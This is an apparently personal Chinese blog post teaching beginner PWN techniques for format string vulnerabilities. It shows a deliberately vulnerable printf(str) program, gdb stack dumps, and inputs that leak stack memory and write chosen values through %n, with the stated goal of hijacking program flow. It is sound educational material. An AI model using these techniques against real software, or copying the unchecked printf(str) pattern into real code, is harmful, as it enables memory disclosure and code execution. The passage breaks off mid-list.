<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN入门-格式化字符串 | Zechariahの博客</title><meta name="author" content="Zechariah"><meta name="copyright" content="Zechariah"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考漏洞挖掘基础之格式化字符串-CSDN博客 格式化字符串函数介绍格式化字符串函数将第一个参数作为格式化字符串，根据其来解析之后的参数。一般来说格式化字符串在利用的时候主要分三个部分  格式化字符串函数 格式化字符串 后续参数格式化字符串函数输入函数：scanf输出函数：   格式化字符串基本格式如下%[parameter] [flag] [field width] [.precision] [">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN入门-格式化字符串">
<meta property="og:url" content="https://zechariah-0703.github.io/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/index.html">
<meta property="og:site_name" content="Zechariahの博客">
<meta property="og:description" content="参考漏洞挖掘基础之格式化字符串-CSDN博客 格式化字符串函数介绍格式化字符串函数将第一个参数作为格式化字符串，根据其来解析之后的参数。一般来说格式化字符串在利用的时候主要分三个部分  格式化字符串函数 格式化字符串 后续参数格式化字符串函数输入函数：scanf输出函数：   格式化字符串基本格式如下%[parameter] [flag] [field width] [.precision] [">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zechariah-0703.github.io/img/fengmian.png">
<meta property="article:published_time" content="2025-02-12T13:37:20.000Z">
<meta property="article:modified_time" content="2025-04-17T12:34:37.580Z">
<meta property="article:author" content="Zechariah">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="格式化字符串漏洞">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zechariah-0703.github.io/img/fengmian.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PWN入门-格式化字符串",
  "url": "https://zechariah-0703.github.io/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/",
  "image": "https://zechariah-0703.github.io/img/fengmian.png",
  "datePublished": "2025-02-12T13:37:20.000Z",
  "dateModified": "2025-04-17T12:34:37.580Z",
  "author": [
    {
      "@type": "Person",
      "name": "Zechariah",
      "url": "https://zechariah-0703.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zechariah-0703.github.io/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN入门-格式化字符串',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/fengmian.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Zechariahの博客</span></a><a class="nav-page-title" href="/"><span class="site-name">PWN入门-格式化字符串</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门-格式化字符串</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-12T13:37:20.000Z" title="发表于 2025-02-12 21:37:20">2025-02-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-17T12:34:37.580Z" title="更新于 2025-04-17 20:34:37">2025-04-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34128411/article/details/87980752">漏洞挖掘基础之格式化字符串-CSDN博客</a></p>
<h2 id="格式化字符串函数介绍"><a href="#格式化字符串函数介绍" class="headerlink" title="格式化字符串函数介绍"></a>格式化字符串函数介绍</h2><p>格式化字符串函数将第一个参数作为格式化字符串，根据其来解析之后的参数。一般来说格式化字符串在利用的时候主要分三个部分</p>
<ul>
<li>格式化字符串函数</li>
<li>格式化字符串</li>
<li>后续参数<h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3>输入函数：<code>scanf</code><br>输出函数：<img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250209201042.png" alt="Pasted image 20250209201042"></li>
</ul>
</blockquote>
<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本格式如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%[parameter] [flag] [field width] [.precision] [length] type</span><br></pre></td></tr></table></figure><br>中括号中的属性是可选的，不需要一定都写上，比如%08x，他就只用到了其中的一部分。下面举几个比较重要的属性讲一下：<br><code>parameter</code></p>
<ul>
<li>n$，获取格式化字符串中的指定参数<br><code>flag</code><br><code>field width</code>，输出的最小宽度<br><code>precision</code>，输出的最大长度<br><code>length</code>，输出的长度</li>
<li>hh，输出一个字节</li>
<li>h，输出一个双字节<br><code>type</code></li>
<li>d/i，有符号整数</li>
<li>u，无符号整数</li>
<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
<li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>
<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>
<li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>
<li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>
<li>%， ‘%’字面值，不接受任何 flags, width。<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3>要输出的变量</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>格式化串漏洞和普通的栈溢出有相似之处，都是利用程序员的疏忽大意来改变程序运行的正常流程。<br>首先，什么是格式化字符串，print()、fprint()等<code>*print()</code>系列的函数可以按照一定的格式将数据进行输出，举个最简单的例子：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;My Name is:  %s&quot;</span> , <span class="string">&quot;Zechariah&quot;</span>)</span><br></pre></td></tr></table></figure><br>执行该函数后将返回字符串：My Name is：Zechariah<br>该printf函数的第一个参数就是格式化字符串，它来告诉程序将数据以什么格式输出。<br>printf()函数的一般形式为：<code>printf(&quot;format&quot;, 输出表列)</code>，我们对format比较关心，看一下它的结构吧：<code>%[标志][输出最小宽度][.精度][长度]类型</code>,其中跟格式化字符串漏洞有关系的主要有以下几点：<br>1、输出最小宽度：用十进制整数来表示输出的最少位数。若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。<br>2、类型：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%c：输出字符，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%d：输出十进制整数，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$1x表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</span><br><span class="line"></span><br><span class="line">%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</span><br><span class="line"></span><br><span class="line">%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n表示将ex64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为八字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整</span><br><span class="line"></span><br><span class="line">%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</span><br></pre></td></tr></table></figure></p>
<p>关于printf()函数的使用，正常我们使用printf()函数应该是这样的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br></pre></td></tr></table></figure>
<p>这是正确的使用方式，但是也有的人会这么用：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br></pre></td></tr></table></figure><br>我们可以对比一下这两段代码，很明显，第二个程序中的printf()函数参数我们是可控的，<strong>我们在控制了format参数之后结合printf()函数的特性就可以进行相应的攻击。</strong></p>
<h2 id="函数特性"><a href="#函数特性" class="headerlink" title="函数特性"></a>函数特性</h2><h4 id="特性一：-printf-函数的参数个数不固定"><a href="#特性一：-printf-函数的参数个数不固定" class="headerlink" title="特性一： printf()函数的参数个数不固定"></a>特性一： printf()函数的参数个数不固定</h4><p>我们可以利用这一特性进行越界数据的访问。我们先看一个正常的程序：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>;</span><br><span class="line"><span class="type">char</span> buf[]=<span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d\n&quot;</span>,buf,a,b,c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们编译之后运行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ gcc -fno-<span class="built_in">stack</span>-protector -o format format.c</span><br><span class="line">[email protected]:~/Desktop/format$ ./format </span><br><span class="line">test <span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>接下来我们做一下测试，我们增加一个printf()的format参数，改为：<br><code>printf(&quot;%s %d %d %d %x\n&quot;,buf,a,b，c)</code>，编译后运行：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ gcc -z execstack -fno-<span class="built_in">stack</span>-protector -o format1 format.c</span><br><span class="line">format.c: In function ‘main’:</span><br><span class="line">format.c:<span class="number">6</span>:<span class="number">1</span>: warning: format ‘%x’ expects a matching ‘<span class="type">unsigned</span> <span class="type">int</span>’ argument [-Wformat=]</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d %x\n&quot;</span>,buf,a,b,c);</span><br><span class="line"> ^</span><br><span class="line">[email protected]:~/Desktop/format$ ./format1</span><br><span class="line">test <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> c30000</span><br></pre></td></tr></table></figure><br>虽然gcc在编译的时候提示了一个warning，但还是编译通过了，我们运行后发现多输出了一个C30000，这是个什么数据呢，我们用gdb调试一下看看吧，我们在printf()函数处下个断点，然后运行程序，程序停在了<code>printf()</code>函数入口处<code>0xb7e652f0 __printf+0 push %ebx</code>。<br>我们查看一下此时的栈布局：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; x/<span class="number">10</span>x $sp</span><br><span class="line"><span class="number">0xbffff00c</span>: <span class="number">0x08048466</span>  <span class="number">0x08048510</span>  <span class="number">0xbffff03f</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff01c</span>: <span class="number">0x00000002</span>  <span class="number">0x00000003</span>  <span class="number">0x00c30000</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff02c</span>: <span class="number">0x080482bd</span>  <span class="number">0xbffff2c4</span></span><br><span class="line"></span><br><span class="line"> &gt;&gt;&gt; x/<span class="number">20</span>x $sp</span><br><span class="line"><span class="number">0xbffff00c</span>: <span class="number">0x08048466</span>  <span class="number">0x08048510</span>  <span class="number">0xbffff03f</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff01c</span>: <span class="number">0x00000002</span>  <span class="number">0x00000003</span>  <span class="number">0x00c30000</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff02c</span>: <span class="number">0x080482bd</span>  <span class="number">0xbffff2c4</span>  <span class="number">0x0000002f</span>  <span class="number">0x0804a000</span></span><br><span class="line"><span class="number">0xbffff03c</span>: <span class="number">0x740484d2</span>  <span class="number">0x00747365</span>  <span class="number">0x00000003</span>  <span class="number">0x00000002</span></span><br><span class="line"><span class="number">0xbffff04c</span>: <span class="number">0x00000001</span>  <span class="number">0xb7fc13c4</span>  <span class="number">0xbffff070</span>  <span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250209183436.png" alt="Pasted image 20250209183436"><br>只要我们能够控制format的，我们就可以一直读取内存数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d %x %x %x %x %x %x %x %x\n&quot;</span>,buf,a,b,c)</span><br><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">test <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> c30000 <span class="number">1</span> <span class="number">80482b</span>d bf8bf301 <span class="number">2f</span> <span class="number">804</span>a000 <span class="number">740484</span>d2 <span class="number">747365</span></span><br></pre></td></tr></table></figure>
<p>上一个例子只是告诉我们可以利用%x一直读取栈内的内存数据，可是这并不能满足我们的需求不是，我们要的是<code>任意地址读取</code>,当然，这也是可以的，我们通过下面的例子进行分析：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    fgets(str,<span class="number">200</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以直接尝试去读取str[]的内容呢<br>gdb调试，单步运行完<code>call 0x8048340 &lt;[email protected]&gt;</code>后输入：<br><code>AAAA%08x%08x%08x%08x%08x%08x</code><br>然后我们执行到printf()函数，观察此时的栈区，特别注意一下0x41414141（这是我们str的开始）：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; x/<span class="number">10</span>x $sp</span><br><span class="line"><span class="number">0xbfffef70</span>: <span class="number">0xbfffef88</span>  <span class="number">0x000000c8</span>  <span class="number">0xb7fc1c20</span>  <span class="number">0xb7e25438</span></span><br><span class="line"><span class="number">0xbfffef80</span>: <span class="number">0x08048210</span>  <span class="number">0x00000001</span>  <span class="number">0x41414141</span>  <span class="number">0x78383025</span></span><br><span class="line"><span class="number">0xbfffef90</span>: <span class="number">0x78383025</span>  <span class="number">0x78383025</span></span><br></pre></td></tr></table></figure><br>这时候我们需要借助printf()函数的另一个重要的格式化字符参数%s，我们可以用%s来获取指针指向的内存数据。<br>那么我们就可以这么构造尝试去获取0x41414141地址上的数据：<br><code>\x41\x41\x41\x41%08x%08x%08x%08x%08x%s</code><br>到现在，我们可以利用格式化字符串漏洞读取内存的内容，看起来好像也没什么用啊，就是读个数据而已，我们能不能利用这个漏洞修改内存信息（比如说修改返回地址）从而劫持程序执行流程?</p>
<h4 id="特性二：利用-n格式符写入数据"><a href="#特性二：利用-n格式符写入数据" class="headerlink" title="特性二：利用%n格式符写入数据"></a>特性二：利用%n格式符写入数据</h4><p>%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，看下面的代码：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num=<span class="number">66666666</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以发现我们用%n成功修改了num的值：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">Before: num = <span class="number">66666666</span></span><br><span class="line"><span class="number">66666666</span></span><br><span class="line">After: num = <span class="number">8</span></span><br></pre></td></tr></table></figure><br>现在我们已经知道可以用构造的格式化字符串去访问栈内的数据，并且<strong>可以利用%n向内存中写入值</strong>，那我们是不是可以修改某一个函数的返回地址从而控制程序执行流程呢，到了这一步细心的同学可能已经发现了，%n的作用只是将前面打印的字符串长度写入到内存中，而我们想要写入的是一个地址，而且这个地址是很大的。这时候我们就需要用到printf()函数的第三个特性来配合完成地址的写入。</p>
<h4 id="特性三：自定义打印字符串宽度"><a href="#特性三：自定义打印字符串宽度" class="headerlink" title="特性三：自定义打印字符串宽度"></a>特性三：自定义打印字符串宽度</h4><p>我们在上面的基础部分已经有提到关于打印字符串宽度的问题，<strong>在格式符中间加上一个十进制整数来表示输出的最少位数，若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0</strong>。我们把上一段代码做一下修改并看一下效果：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num=<span class="number">66666666</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%.100d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到我们的num值被改为了100<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">Before: num = <span class="number">66666666</span></span><br><span class="line"><span class="number">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="number">66666666</span></span><br><span class="line">After: num = <span class="number">100</span></span><br></pre></td></tr></table></figure><br>如何去覆盖一个地址？，例如把0x8048000这个地址写入内存，我们要做的就是把该<strong>地址对应的10进制134512640</strong>作为格式符控制宽度即可：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.134512640d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;After: num = %x\n&quot;</span>, num);</span><br></pre></td></tr></table></figure><br>可以看到，我们的num被成功修改为8048000<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">Before: num = <span class="number">66666666</span></span><br><span class="line">中间的<span class="number">0</span>省略...........</span><br><span class="line"><span class="number">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666</span></span><br><span class="line">After: num = <span class="number">8048000</span></span><br><span class="line">[email protected]:~/Desktop/format$ </span><br></pre></td></tr></table></figure></p>
<h3 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h3><p>格式化字符串函数是根据格式化字符串来进行解析的，那么响应的要被解析的参数的个数也是由这个格式化字符串所控制。<br><img src="/img/loading.gif" data-original="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210182528.png" alt="Pasted image 20250210182528"><br>正常的printf函数的结构是格式化字符串与参数一一对应的。那么在调用printf函数的时候参数从右向左进栈，进栈之后格式化字符串是在栈顶的位置。那么在进入printf之后，函数首先获取第一个参数，也就是此时栈顶的格式化字符串，一个一个读取其字符串会遇到两种情况</p>
<ul>
<li>当前字符串不是%，直接输出到相应标准输出，比如直接输出一个’hello word‘</li>
<li>当字符是%，继续读取下一个字符<ul>
<li>如果没哟字符，报错</li>
<li>如果下一个字符是%，输出%</li>
<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
</ul>
</li>
</ul>
<p>如果缺少参数呢，例如下面这样：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);</span><br></pre></td></tr></table></figure></p>
<p>此时可以发现并没有提供参数，那么程序如何运行呢？程序会照样运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为：</p>
<ul>
<li>解析其地址对应的字符串</li>
<li>解析其内容对应的整形值</li>
